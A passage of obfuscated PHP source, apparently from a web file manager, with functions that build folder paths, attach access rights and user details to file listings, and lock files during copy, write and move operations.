Model($æãÑ‚Éì[579])->getSourceList($ÊŠÛÅ§”, $¾•Ÿœµ¿); $¬ÊÆÇõò = KodUser::isRoot(); foreach ($àØ­á˜Ì as $Äéµ¤¥ß => &$ŞÃşÑ€) { $ŞÃşÑ€[$æãÑ‚Éì[497]] = $´—ÓßÇá[$ŞÃşÑ€[$æãÑ‚Éì[194]]]; if (!$ŞÃşÑ€[$æãÑ‚Éì[497]] && $ŞÃşÑ€[$æãÑ‚Éì[191]] == self::TYPE_GROUP) { $ŞÃşÑ€[$æãÑ‚Éì[497]] = Action($æãÑ‚Éì[580])->pathGroupAuthMake($ŞÃşÑ€[$æãÑ‚Éì[581]]); if (!$ŞÃşÑ€[$æãÑ‚Éì[497]] && !$¬ÊÆÇõò) { $ŞÃşÑ€[$æãÑ‚Éì[236]] = !1; $ŞÃşÑ€[$æãÑ‚Éì[235]] = !1; } } if ($ŞÃşÑ€[$æãÑ‚Éì[497]]) { $ŞÃşÑ€[$æãÑ‚Éì[236]] = AuthModel::authCheckEdit($ŞÃşÑ€[$æãÑ‚Éì[497]][$æãÑ‚Éì[498]]); $ŞÃşÑ€[$æãÑ‚Éì[235]] = AuthModel::authCheckView($ŞÃşÑ€[$æãÑ‚Éì[497]][$æãÑ‚Éì[498]]); } $this->groupPathDisplay($ŞÃşÑ€); } unset($ŞÃşÑ€); } public function _listAppendAuthSecret(&$²ÇÇ·ôê) { $ä‚ú¾à¨ =& $_SERVER[É¨™èà]; if (Model($ä‚ú¾à¨[518])->get($ä‚ú¾à¨[582]) != $ä‚ú¾à¨[91]) { return; } static $—Ñ†ª–ç = false; if (!$—Ñ†ª–ç) { $ø¯€¥âÒ = Model($ä‚ú¾à¨[583]); $î³„ Ğº = Model($ä‚ú¾à¨[584]); $—Ñ†ª–ç = $î³„ Ğº->listData(); $—Ñ†ª–ç = array_to_keyvalue($—Ñ†ª–ç, $ä‚ú¾à¨[194]); $“Ã­‚Èï = json_decode(Model($ä‚ú¾à¨[518])->get($ä‚ú¾à¨[585]), !0); $“Ã­‚Èï = array_to_keyvalue($“Ã­‚Èï, $ä‚ú¾à¨[485]); foreach ($—Ñ†ª–ç as $Ğç­‹Êà => $µØ¼øÌ) { $š ³¿‘‰ = $“Ã­‚Èï[$µØ¼øÌ[$ä‚ú¾à¨[586]]]; if (!$š ³¿‘‰) { $î³„ Ğº->remove($µØ¼øÌ[$ä‚ú¾à¨[485]]); unset($—Ñ†ª–ç[$Ğç­‹Êà]); continue; } $â°øÎƒ£ = $ø¯€¥âÒ->listData($š ³¿‘‰[$ä‚ú¾à¨[497]]); if (!$â°øÎƒ£) { $î³„ Ğº->remove($µØ¼øÌ[$ä‚ú¾à¨[485]]); unset($—Ñ†ª–ç[$Ğç­‹Êà]); continue; } $µØ¼øÌ[$ä‚ú¾à¨[497]] = $â°øÎƒ£; $µØ¼øÌ[$ä‚ú¾à¨[587]] = $š ³¿‘‰; $µØ¼øÌ[$ä‚ú¾à¨[588]] = Model($ä‚ú¾à¨[589])->getInfoSimpleOuter($µØ¼øÌ[$ä‚ú¾à¨[537]]); $—Ñ†ª–ç[$Ğç­‹Êà] = $µØ¼øÌ; } } $Ê¡ûì† = USER_ID; $¸¸•°«’ = array(); $ÌçŠô«Õ = $this->_listAppendPath($¸¸•°«’, !0); foreach ($²ÇÇ·ôê as $Ğç­‹Êà => &$µØ¼øÌ) { if (!is_array($µØ¼øÌ[$ä‚ú¾à¨[497]])) { continue; } if ($µØ¼øÌ[$ä‚ú¾à¨[191]] != $ä‚ú¾à¨[590]) { continue; } if (isset($—Ñ†ª–ç[$µØ¼øÌ[$ä‚ú¾à¨[194]]])) { $ôŞğœÄ = $—Ñ†ª–ç[$µØ¼øÌ[$ä‚ú¾à¨[194]]]; if (!is_array($µØ¼øÌ[$ä‚ú¾à¨[551]])) { $µØ¼øÌ[$ä‚ú¾à¨[551]] = array(); } $µØ¼øÌ[$ä‚ú¾à¨[551]][$ä‚ú¾à¨[591]] = $ôŞğœÄ[$ä‚ú¾à¨[586]]; $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[592]] = $ôŞğœÄ; $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[593]] = $µØ¼øÌ[$ä‚ú¾à¨[594]]; $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[595]] = $ä‚ú¾à¨[91]; if ($ôŞğœÄ[$ä‚ú¾à¨[537]] != $Ê¡ûì†) { $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[498]] = $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[498]] & $ôŞğœÄ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[497]]; } continue; } $íÓ‚Æµ® = $this->parentLevelArray($µØ¼øÌ[$ä‚ú¾à¨[596]]); $ÁÂêûúÒ = array_reverse($íÓ‚Æµ®); foreach ($ÁÂêûúÒ as $Ò‚°é¦¢ => $µî¥†õ) { if (!isset($—Ñ†ª–ç[$µî¥†õ])) { continue; } $ôŞğœÄ = $—Ñ†ª–ç[$µî¥†õ]; $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[592]] = $ôŞğœÄ; if ($ôŞğœÄ[$ä‚ú¾à¨[537]] != $Ê¡ûì†) { $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[498]] = $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[498]] & $ôŞğœÄ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[497]]; } $ÔóÌéÅ = $ä‚ú¾à¨[12]; $Ô¨íÆÅ¥ = count($íÓ‚Æµ®) - $Ò‚°é¦¢; for ($æ¦’¿ùâ = 0; $æ¦’¿ùâ < $Ô¨íÆÅ¥; $æ¦’¿ùâ++) { if (!isset($ÌçŠô«Õ[$íÓ‚Æµ®[$æ¦’¿ùâ]])) { $ÔóÌéÅ = $ä‚ú¾à¨[12]; break; } $ÔóÌéÅ = $ÔóÌéÅ . rtrim($ÌçŠô«Õ[$íÓ‚Æµ®[$æ¦’¿ùâ]], $ä‚ú¾à¨[8]) . $ä‚ú¾à¨[8]; } $µØ¼øÌ[$ä‚ú¾à¨[497]][$ä‚ú¾à¨[593]] = rtrim($ÔóÌéÅ, $ä‚ú¾à¨[8]) . $ä‚ú¾à¨[8]; break; } } unset($µØ¼øÌ); } public function groupPathDisplay(&$éóåÂ£Â) { $Ü¹¥¹É­ =& $_SERVER[É¨™èà]; if ($éóåÂ£Â[$Ü¹¥¹É­[191]] != self::TYPE_GROUP) { return; } $Ç®–¤´» = Model($Ü¹¥¹É­[597])->getInfo($éóåÂ£Â[$Ü¹¥¹É­[581]]); $Á¬´ü· = $this->parentLevelArray($Ç®–¤´»[$Ü¹¥¹É­[596]]); $ØŞ›™âş = $Ü¹¥¹É­[12]; foreach ($Á¬´ü· as $üÑËãõ§) { $™Á€·‘É = Model($Ü¹¥¹É­[597])->getInfo($üÑËãõ§); $ØŞ›™âş .= $™Á€·‘É[$Ü¹¥¹É­[90]][$Ü¹¥¹É­[194]] . $Ü¹¥¹É­[50]; } $éóåÂ£Â[$Ü¹¥¹É­[598]] = $Ç®–¤´»[$Ü¹¥¹É­[193]]; $éóåÂ£Â[$Ü¹¥¹É­[599]] = $Ç®–¤´»[$Ü¹¥¹É­[596]]; $éóåÂ£Â[$Ü¹¥¹É­[600]] = $Ç®–¤´»[$Ü¹¥¹É­[601]]; $éóåÂ£Â[$Ü¹¥¹É­[602]] = $ØŞ›™âş . $Ç®–¤´»[$Ü¹¥¹É­[90]][$Ü¹¥¹É­[194]]; } protected function _listAppendPath(&$Ç¬ıÕÁÁ, $ÕšŞË² = false) { $ò÷­”™Ç =& $_SERVER[É¨™èà]; static $ÑÁÏÏ‹’ = array(); $€ğÏ¥Ùâ = array(); $‹áŞÅóã = array(); if ($ÕšŞË²) { return $ÑÁÏÏ‹’; } foreach ($Ç¬ıÕÁÁ as &$ıŞ¬Ô¡×) { $éì ™ôï = $ıŞ¬Ô¡×[$ò÷­”™Ç[194]]; if ($ıŞ¬Ô¡×[$ò÷­”™Ç[495]] == $ò÷­”™Ç[91] && $ıŞ¬Ô¡×[$ò÷­”™Ç[193]] != 0) { $ÑÁÏÏ‹’[$éì ™ôï] = $ıŞ¬Ô¡×[$ò÷­”™Ç[32]]; } if ($ıŞ¬Ô¡×[$ò÷­”™Ç[495]] == $ò÷­”™Ç[91] && $ıŞ¬Ô¡×[$ò÷­”™Ç[193]] == 0) { $ÑÁÏÏ‹’[$éì ™ôï] = $this->_listAppendPathRoot($ıŞ¬Ô¡×, array()); } if (isset($‹áŞÅóã[$ıŞ¬Ô¡×[$ò÷­”™Ç[596]]])) { continue; } $‹áŞÅóã[$ıŞ¬Ô¡×[$ò÷­”™Ç[596]]] = !0; $”ùº“Ì’ = $this->parentLevelArray($ıŞ¬Ô¡×[$ò÷­”™Ç[596]]); foreach ($”ùº“Ì’ as $¶ÇÃ—ãı => $•ëŒŠ½) { if (isset($ÑÁÏÏ‹’[$•ëŒŠ½])) { continue; } if ($¶ÇÃ—ãı == 0) { $ÑÁÏÏ‹’[$•ëŒŠ½] = $this->_listAppendPathRoot($ıŞ¬Ô¡×, $”ùº“Ì’); } if ($¶ÇÃ—ãı != 0) { $€ğÏ¥Ùâ[] = $•ëŒŠ½; } } } unset($ıŞ¬Ô¡×); $€ğÏ¥Ùâ = array_unique($€ğÏ¥Ùâ); if (count($€ğÏ¥Ùâ) > 0) { $âçè†Á˜ = array($ò÷­”™Ç[501] => array($ò÷­”™Ç[502], $€ğÏ¥Ùâ)); if (count($€ğÏ¥Ùâ) == 1) { $èÉÎÆñå = $this->sourceInfo($€ğÏ¥Ùâ[0]); $¡ÖÜ°şï = is_array($èÉÎÆñå) ? array($èÉÎÆñå) : !1; } else { $¡ÖÜ°şï = $this->field($ò÷­”™Ç[603])->where($âçè†Á˜)->select(); } if (!$¡ÖÜ°şï) { $¡ÖÜ°şï = array(); } foreach ($¡ÖÜ°şï as $…¹¿ó¼®) { $ÑÁÏÏ‹’[$…¹¿ó¼®[$ò÷­”™Ç[194]]] = $…¹¿ó¼®[$ò÷­”™Ç[32]]; } } $Ãƒñõï = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $À·‘Şéõ = array(); foreach ($Ç¬ıÕÁÁ as &$ıŞ¬Ô¡×) { $„®‘ËÒ¶ = $ıŞ¬Ô¡×[$ò÷­”™Ç[596]]; $Ë„€¢õ‡ = $ò÷­”™Ç[12]; if (isset($À·‘Şéõ[$„®‘ËÒ¶])) { $Ë„€¢õ‡ = $À·‘Şéõ[$„®‘ËÒ¶]; } else { $”ùº“Ì’ = $this->parentLevelArray($ıŞ¬Ô¡×[$ò÷­”™Ç[596]]); foreach ($”ùº“Ì’ as $¶ÇÃ—ãı => $•ëŒŠ½) { if (isset($ÑÁÏÏ‹’[$•ëŒŠ½])) { $Ë„€¢õ‡ .= $ÑÁÏÏ‹’[$•ëŒŠ½] . $ò÷­”™Ç[8]; } } $À·‘Şéõ[$„®‘ËÒ¶] = $Ë„€¢õ‡; } $Ë„€¢õ‡ .= $ıŞ¬Ô¡×[$ò÷­”™Ç[32]]; if ($ıŞ¬Ô¡×[$ò÷­”™Ç[495]] == $ò÷­”™Ç[91]) { $Ë„€¢õ‡ .= $ò÷­”™Ç[8]; } $ıŞ¬Ô¡×[$ò÷­”™Ç[594]] = str_replace($ò÷­”™Ç[257], $ò÷­”™Ç[8], $Ë„€¢õ‡); if ($ıŞ¬Ô¡×[$ò÷­”™Ç[193]] == $ò÷­”™Ç[231]) { $ıŞ¬Ô¡×[$ò÷­”™Ç[32]] = trim($ÑÁÏÏ‹’[$ıŞ¬Ô¡×[$ò÷­”™Ç[194]]], $ò÷­”™Ç[8]); $ıŞ¬Ô¡×[$ò÷­”™Ç[594]] = $ıŞ¬Ô¡×[$ò÷­”™Ç[32]] . $ò÷­”™Ç[8]; } if (intval($ıŞ¬Ô¡×[$ò÷­”™Ç[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ıŞ¬Ô¡×, $”ùº“Ì’, $Ãƒñõï); } } unset($ıŞ¬Ô¡×); return $Ç¬ıÕÁÁ; } private function _listAppendPathRecycle(&$ò·˜ƒÃé, $³ì‰±‚§, $ÚÀãÓ¿) { $—ôÈ¦å =& $_SERVER[É¨™èà]; if (!in_array($ÚÀãÓ¿, $³ì‰±‚§) && $ò·˜ƒÃé[$—ôÈ¦å[194]] != $ÚÀãÓ¿) { return; } $Æœ÷Îº€ = explode($—ôÈ¦å[8], trim($ò·˜ƒÃé[$—ôÈ¦å[594]], $—ôÈ¦å[8])); $á¸Ë¨³è = implode($—ôÈ¦å[8], array_slice($Æœ÷Îº€, 2)); $ò·˜ƒÃé[$—ôÈ¦å[594]] = $—ôÈ¦å[8] . LNG($—ôÈ¦å[604]) . $—ôÈ¦å[8] . ltrim($á¸Ë¨³è, $—ôÈ¦å[8]); $ò·˜ƒÃé[$—ôÈ¦å[596]] = $—ôÈ¦å[605] . implode($—ôÈ¦å[50], array_slice($³ì‰±‚§, 1)) . $—ôÈ¦å[50]; if ($ò·˜ƒÃé[$—ôÈ¦å[194]] == $ÚÀãÓ¿) { $ò·˜ƒÃé[$—ôÈ¦å[596]] = $—ôÈ¦å[605]; $ò·˜ƒÃé[$—ôÈ¦å[193]] = $—ôÈ¦å[231]; $ò·˜ƒÃé[$—ôÈ¦å[32]] = LNG($—ôÈ¦å[604]); } $ò·˜ƒÃé[$—ôÈ¦å[606]] = $—ôÈ¦å[607]; } protected function _listAppendPathRoot(&$Ğà†¿ù×, $æö‰ÓëØ) { $ŒÖ™ëûë =& $_SERVER[É¨™èà]; static $ÑîÀí¬ç = false; static $ÁÁ°«„® = false; $ÖšÙùø = $ŒÖ™ëûë[12]; if ($Ğà†¿ù×[$ŒÖ™ëûë[191]] == self::TYPE_USER) { if ($Ğà†¿ù×[$ŒÖ™ëûë[581]] == USER_ID) { $ÖšÙùø = LNG($ŒÖ™ëûë[608]); if ($ÑîÀí¬ç === !1) { $®”¹™òÜ = Model($ŒÖ™ëûë[609])->getInfoFull(USER_ID); $ÑîÀí¬ç = _get($®”¹™òÜ, $ŒÖ™ëûë[610], $ŒÖ™ëûë[12]); } if ($ÁÁ°«„® === !1) { $®”¹™òÜ = Model($ŒÖ™ëûë[609])->getInfoFull(USER_ID); $ÁÁ°«„® = _get($®”¹™òÜ, $ŒÖ™ëûë[611], $ŒÖ™ëûë[12]); } if ($æö‰ÓëØ && $æö‰ÓëØ[0] == $ÑîÀí¬ç || !$æö‰ÓëØ && $Ğà†¿ù×[$ŒÖ™ëûë[194]] == $ÑîÀí¬ç) { $ÖšÙùø = LNG($ŒÖ™ëûë[612]); $Ğà†¿ù×[$ŒÖ™ëûë[613]] = $ŒÖ™ëûë[614]; } if ($æö‰ÓëØ && $æö‰ÓëØ[0] == $ÁÁ°«„® || !$æö‰ÓëØ && $Ğà†¿ù×[$ŒÖ™ëûë[194]] == $ÁÁ°«„®) { $ÖšÙùø = $ÖšÙùø . $ŒÖ™ëûë[615] . LNG($ŒÖ™ëûë[616]); } if (!$æö‰ÓëØ) { $Ğà†¿ù×[$ŒÖ™ëûë[32]] = $ÖšÙùø; } } else { $®”¹™òÜ = Model($ŒÖ™ëûë[609])->getInfoFull($Ğà†¿ù×[$ŒÖ™ëûë[581]]); $¢û¾¬Ú = _get($®”¹™òÜ, $ŒÖ™ëûë[611], $ŒÖ™ëûë[12]); $Ğà†¿ù×[$ŒÖ™ëûë[617]] = Model($ŒÖ™ëûë[589])->getInfoSimpleOuter($Ğà†¿ù×[$ŒÖ™ëûë[581]]); $ÖšÙùø = LNG($ŒÖ™ëûë[618]) . $ŒÖ™ëûë[176] . $Ğà†¿ù×[$ŒÖ™ëûë[617]][$ŒÖ™ëûë[32]] . $ŒÖ™ëûë[178]; if ($æö‰ÓëØ && $æö‰ÓëØ[0] == $¢û¾¬Ú || !$æö‰ÓëØ && $Ğà†¿ù×[$ŒÖ™ëûë[194]] == $¢û¾¬Ú) { $ÖšÙùø = LNG($ŒÖ™ëûë[618]) . $ŒÖ™ëûë[619] . $Ğà†¿ù×[$ŒÖ™ëûë[617]][$ŒÖ™ëûë[32]] . $ŒÖ™ëûë[615] . LNG($ŒÖ™ëûë[616]) . $ŒÖ™ëûë[178]; } } } else { if ($Ğà†¿ù×[$ŒÖ™ëûë[191]] == self::TYPE_GROUP) { $´êéÉ­Å = Model($ŒÖ™ëûë[597])->getInfoSimple($Ğà†¿ù×[$ŒÖ™ëûë[581]]); $ÖšÙùø = $´êéÉ­Å[$ŒÖ™ëûë[32]]; } else { if ($Ğà†¿ù×[$ŒÖ™ëûë[191]] == self::TYPE_SYSTEM) { $ÖšÙùø = $ŒÖ™ëûë[620]; } } } $ÖšÙùø = $ÖšÙùø ? $ŒÖ™ëûë[8] . $ÖšÙùø . $ŒÖ™ëûë[8] : $ŒÖ™ëûë[8]; return $ÖšÙùø; } protected function _listAppendUser(&$’ù“ªì‡) { $÷µ«¼Ş¨ =& $_SERVER[É¨™èà]; $×æÓ¬æˆ = array_to_keyvalue($’ù“ªì‡, $÷µ«¼Ş¨[12], $÷µ«¼Ş¨[537]); $×Õíä‰‚ = array_to_keyvalue($’ù“ªì‡, $÷µ«¼Ş¨[12], $÷µ«¼Ş¨[539]); $×ÓêÅ±ã = array_merge($×æÓ¬æˆ, $×Õíä‰‚); $ÑĞì® = Model($÷µ«¼Ş¨[609])->userListInfo($×ÓêÅ±ã); foreach ($’ù“ªì‡ as &$£º¹û›ê) { $„š×ûØÆ = $£º¹û›ê[$÷µ«¼Ş¨[537]]; $£º¹û›ê[$÷µ«¼Ş¨[537]] = $ÑĞì®[$„š×ûØÆ] ? $ÑĞì®[$„š×ûØÆ] : !1; $„š×ûØÆ = $£º¹û›ê[$÷µ«¼Ş¨[539]]; $£º¹û›ê[$÷µ«¼Ş¨[539]] = $ÑĞì®[$„š×ûØÆ] ? $ÑĞì®[$„š×ûØÆ] : !1; if (_get($£º¹û›ê, $÷µ«¼Ş¨[621], 0)) { $çœÚ¼ÏÄ = $GLOBALS[$÷µ«¼Ş¨[6]][$÷µ«¼Ş¨[92]][$÷µ«¼Ş¨[622]]; if ($£º¹û›ê[$÷µ«¼Ş¨[551]][$÷µ«¼Ş¨[623]] <= time() - $çœÚ¼ÏÄ) { $this->metaSet($£º¹û›ê[$÷µ«¼Ş¨[194]], $÷µ«¼Ş¨[624], null); $this->metaSet($£º¹û›ê[$÷µ«¼Ş¨[194]], $÷µ«¼Ş¨[623], null); unset($£º¹û›ê[$÷µ«¼Ş¨[551]][$÷µ«¼Ş¨[624]]); continue; } $öî„ªíÊ = $£º¹û›ê[$÷µ«¼Ş¨[551]][$÷µ«¼Ş¨[624]]; $£º¹û›ê[$÷µ«¼Ş¨[551]][$÷µ«¼Ş¨[625]] = Model($÷µ«¼Ş¨[609])->getInfoSimpleOuter($öî„ªíÊ); } } unset($£º¹û›ê); } public function parentLevelArray($ÅºšÆ£¹) { $‡’ÓÍÎù =& $_SERVER[É¨™èà]; $ÅºšÆ£¹ = explode($‡’ÓÍÎù[50], trim($ÅºšÆ£¹, $‡’ÓÍÎù[50])); return array_remove_value($ÅºšÆ£¹, $‡’ÓÍÎù[231]); } public function listAll($İîô€·Â) { $§ÏµáËÄ =& $_SERVER[É¨™èà]; $±‹†³Â = $this->sourceInfo($İîô€·Â); $ŠóÜŠ¨Œ = array($§ÏµáËÄ[626] => array($§ÏµáËÄ[627], $±‹†³Â[$§ÏµáËÄ[596]] . $İîô€·Â . $§ÏµáËÄ[628]), $§ÏµáËÄ[629] => 0); $æ©¬Ÿ“Î = $§ÏµáËÄ[630]; $Ü–µ†ğ« = "\114\x45\106\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\145\40\146\x69\154\x65\40\x6f\x6e\x20\163\157\x75\x72\143\x65\56\146\151\154\x65\111\x44\x20\x3d\x20\146\151\x6c\x65\x2e\x66\151\x6c\145\x49\x44"; $º²‚İìØ = $this->alias($§ÏµáËÄ[529])->field($æ©¬Ÿ“Î)->where($ŠóÜŠ¨Œ)->join($Ü–µ†ğ«)->select(); $this->_listAppendAuth($º²‚İìØ); $this->_listAppendUser($º²‚İìØ); $this->_listAppendPath($º²‚İìØ); $º²‚İìØ = array_to_keyvalue($º²‚İìØ, $§ÏµáËÄ[194]); $ë‘‘°¬¾ = "\x2f{$±‹†³Â[$§ÏµáËÄ[32]]}\x2f"; $ë‘‘°¬¾ = $ë‘‘°¬¾ == $§ÏµáËÄ[257] ? $§ÏµáËÄ[8] : $ë‘‘°¬¾; $ı¨üà´³ = array(); foreach ($º²‚İìØ as $úµ¯³ÎÓ => $ëŸ’éÅ½) { $×ì°¯ãğ = $this->parentLevelArray($ëŸ’éÅ½[$§ÏµáËÄ[596]]); array_shift($×ì°¯ãğ); $‚§Èòó = $ë‘‘°¬¾; for ($µ«ş¾ú® = 0; $µ«ş¾ú® < count($×ì°¯ãğ); $µ«ş¾ú®++) { $‚§Èòó .= $º²‚İìØ[$×ì°¯ãğ[$µ«ş¾ú®]][$§ÏµáËÄ[32]] . $§ÏµáËÄ[8]; } $‚§Èòó .= $ëŸ’éÅ½[$§ÏµáËÄ[32]]; if ($ëŸ’éÅ½[$§ÏµáËÄ[495]]) { $‚§Èòó .= $§ÏµáËÄ[8]; } $Ö–± ˜Ï = array($§ÏµáËÄ[505] => str_replace($§ÏµáËÄ[257], $§ÏµáËÄ[8], str_replace($§ÏµáËÄ[257], $§ÏµáËÄ[8], str_replace($§ÏµáËÄ[257], $§ÏµáËÄ[8], $‚§Èòó))), $§ÏµáËÄ[631] => intval($ëŸ’éÅ½[$§ÏµáËÄ[495]]), $§ÏµáËÄ[632] => intval($ëŸ’éÅ½[$§ÏµáËÄ[79]]), $§ÏµáËÄ[88] => intval($ëŸ’éÅ½[$§ÏµáËÄ[88]]), $§ÏµáËÄ[90] => $this->pathInfoFilter($ëŸ’éÅ½)); if (!$Ö–± ˜Ï[$§ÏµáËÄ[495]]) { $Ö–± ˜Ï[$§ÏµáËÄ[553]] = $ëŸ’éÅ½[$§ÏµáËÄ[553]]; } $ı¨üà´³[] = $Ö–± ˜Ï; } $ı¨üà´³ = array_sort_by($ı¨üà´³, $§ÏµáËÄ[87]); return $ı¨üà´³; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ì¶ÍÔş) { $„‚è¨áÆ =& $_SERVER[É¨™èà]; if (!$this->allowLock()) { return; } $this->_lockCheck($„‚è¨áÆ[633], $Ì¶ÍÔş); $€¶àä = 1; $this->_lockEvent($Ì¶ÍÔş, array($„‚è¨áÆ[634], $„‚è¨áÆ[635]), $€¶àä); $this->_lockParent($Ì¶ÍÔş, array($„‚è¨áÆ[635]), $€¶àä); $this->_lockEvent($Ì¶ÍÔş, array($„‚è¨áÆ[636], $„‚è¨áÆ[637]), $€¶àä); $this->_lockCheckEnd($„‚è¨áÆ[633], $Ì¶ÍÔş); } public function lockCopyEnd($Ì¾‰Æ†) { $Àšº¤¸û =& $_SERVER[É¨™èà]; if (!$this->allowLock()) { return; } $ªíªõ»Á = 0; $this->_lockEvent($Ì¾‰Æ†, array($Àšº¤¸û[634], $Àšº¤¸û[635]), $ªíªõ»Á); $this->_lockParent($Ì¾‰Æ†, array($Àšº¤¸û[635]), $ªíªõ»Á); $this->_lockEvent($Ì¾‰Æ†, array($Àšº¤¸û[636], $Àšº¤¸û[637]), $ªíªõ»Á); } public function lockWriteStart($ü‡û¾¼°, $”êÇ´š = '') { $Òå‡úûÁ =& $_SERVER[É¨™èà]; if (!$this->allowLock()) { return; } $this->_lockCheck($Òå‡úûÁ[634], $ü‡û¾¼°); $®ïÊ›î = 1; $this->_lockKey($Òå‡úûÁ[638] . $ü‡û¾¼° . $Òå‡úûÁ[10] . $”êÇ´š, $®ïÊ›î); $this->_lockEvent($ü‡û¾¼°, array($Òå‡úûÁ[633], $Òå‡úûÁ[635]), $®ïÊ›î); $this->_lockParent($ü‡û¾¼°, array($Òå‡úûÁ[633], $Òå‡úûÁ[635]), $®ïÊ›î); $this->_lockCheckEnd($Òå‡úûÁ[634], $ü‡û¾¼°); } public function lockWriteEnd($ÀÉåâ«•, $–äØ§ì÷ = '') { $Ğ¾é¸à¿ =& $_SERVER[É¨™èà]; if (!$this->allowLock()) { return; } $¾éò¥î = 0; $this->_lockKey($Ğ¾é¸à¿[638] . $ÀÉåâ«• . $Ğ¾é¸à¿[10] . $–äØ§ì÷, $¾éò¥î); $this->_lockEvent($ÀÉåâ«•, array($Ğ¾é¸à¿[633], $Ğ¾é¸à¿[635]), $¾éò¥î); $this->_lockParent($ÀÉåâ«•, array($Ğ¾é¸à¿[633], $Ğ¾é¸à¿[635]), $¾éò¥î); } public function lockMoveStart($Ÿ‚ïÒ¹±) { $“ó¨×³Œ =& $_SERVER[É¨™èà]; if (!$this->allowLock()) { return; } $this->_lockCheck($“ó¨×³Œ[635], $Ÿ‚ïÒ¹±); $ßéßâÛ° = 1; $this->_lockKey($“ó¨×³Œ[639] . $Ÿ‚ïÒ¹±, $ßéßâÛ°); $this->_lockEvent($Ÿ‚ïÒ¹±, array($“ó¨×³Œ[633], $“ó¨×³Œ[634]), $ßéßâÛ°); $this->_lockParent($Ÿ‚ïÒ¹±, array($“ó¨×³Œ[633], $“ó¨×³Œ[635]), $ßéßâÛ°); $this->_lockEvent($Ÿ‚ïÒ¹±, array($“ó¨×³Œ[640], $“ó¨×³Œ[636], $“ó¨×³Œ[637]), $ßéßâÛ°); $this->_lockCheckEnd($“ó¨×³Œ[635], $Ÿ‚ïÒ¹±); } public function lockMoveEnd($Ìúã•â÷) { $¶ç¨Ûğñ =& $_SERVER[É¨™èà]; if (!$this->allowLock()) { return; } $Ûä¢Ï¶§ = 0; $this->_lockKey($¶ç¨Ûğñ[639] . $Ìúã•â÷, $Ûä¢Ï¶§); $this->_lockEvent($Ìúã•â÷, array($¶ç¨Ûğñ[633], $¶ç¨Ûğñ[634]), $Ûä¢Ï¶§); $this->_lockParent($Ìúã•â÷, array($¶ç¨Ûğñ[633], $¶ç¨Ûğñ[635]), $Ûä¢Ï¶§); $this->_lockEvent($Ìúã•â÷, array($¶ç¨Ûğñ[640], $¶ç¨Ûğñ[636], $¶ç¨Ûğñ[637]), $Ûä¢Ï¶§); } private function _lockCheck($ã˜Ñ©°¹, $ûÏåáÏ¯) { $Î­¹¥¤Î =& $_SERVER[É¨™èà]; $Ùˆ–¼æ‡ = $this->sourceInfo($ûÏåáÏ¯); $¡­—ª™ = $ã˜Ñ©°¹ . $Î­¹¥¤Î[10] . $ûÏåáÏ¯; $this->_lockTimeStart[$¡­—ª™] = timeFloat(); if (!is_array($Ùˆ–¼æ‡)) { return; } $Œ”®°ï­ = LNG($Î­¹¥¤Î[641]); CacheLock::setErrorMsg($Î­¹¥¤Î[176] . htmlspecialchars($Ùˆ–¼æ‡[$Î­¹¥¤Î[32]]) . $Î­¹¥¤Î[178] . $Œ”®°ï­); $this->_lockKey($¡­—ª™, 1); $this->_lockKey($¡­—ª™, 0); $†¾°ì› = array_reverse($this->parentLevelArray($Ùˆ–¼æ‡[$Î­¹¥¤Î[596]])); foreach ($†¾°ì› as $ÁÈı Ÿã) { $¡­—ª™ = $ã˜Ñ©°¹ . $Î­¹¥¤Î[642] . $ÁÈı Ÿã; if (CacheLock::lockGet($Î­¹¥¤Î[643] . $¡­—ª™)) { $Ùˆ–¼æ‡ = $this->sourceInfo($ÁÈı Ÿã); CacheLock::setErrorMsg($Î­¹¥¤Î[176] . htmlspecialchars($Ùˆ–¼æ‡[$Î­¹¥¤Î[32]]) . $Î­¹¥¤Î[178] . $Œ”®°ï­); $this->_lockKey($¡­—ª™, 1); $this->_lockKey($¡­—ª™, 0); } } } private function _lockCheckEnd($Äº¥•Õß, $•â®îÇ ) { $†˜¨Øä =& $_SERVER[É¨™èà]; $÷şŞ³ü = $Äº¥•Õß . $†˜¨Øä[10] . $•â®îÇ ; CacheLock::setErrorMsg($†˜¨Øä[316]); if (!isset($this->_lockTimeStart[$÷şŞ³ü])) { return; } $àğƒ€²ñ = timeFloat() - $this->_lockTimeStart[$÷şŞ³ü]; unset($this->_lockTimeStart[$÷şŞ³ü]); if ($àğƒ€²ñ > 0.5) { unset(self::$cacheSourceInfo[$†˜¨Øä[543] . $•â®îÇ ]); } $¼—ù«Ñ = $this->sourceInfo($•â®îÇ ); if (!$¼—ù«Ñ) { show_json(LNG($†˜¨Øä[108]), !1); } } private function _lockParent($ßÔ°‚×, $Ï¦ßÁ„È, $”šé”’ì) { if (!$this->autoLockSet) { return; } $òÀ˜¾¸ = $this->sourceInfo($ßÔ°‚×); if (!is_array($òÀ˜¾¸)) { return; } $Å Î¾ìÎ = array_reverse($this->parentLevelArray($òÀ˜¾¸[$_SERVER[É¨™èà][596]])); foreach ($Å Î¾ìÎ as $µ¦˜µá) { $this->_lockEvent($µ¦˜µá, $Ï¦ßÁ„È, $”šé”’ì); } } private function _lockEvent($›–±‘¢, $ğÚÌ–Ò, $ šğÑùÚ) { $…‚„œÚÛ =& $_SERVER[É¨™èà]; if (!$this->autoLockSet) { return; } foreach ($ğÚÌ–Ò as $–™´ë¿ö) { $ú‚†Ò‹Ş = $–™´ë¿ö . $…‚„œÚÛ[10] . $›–±‘¢; if ($ šğÑùÚ && CacheLock::lockGet($…‚„œÚÛ[643] . $ú‚†Ò‹Ş)) { continue; } 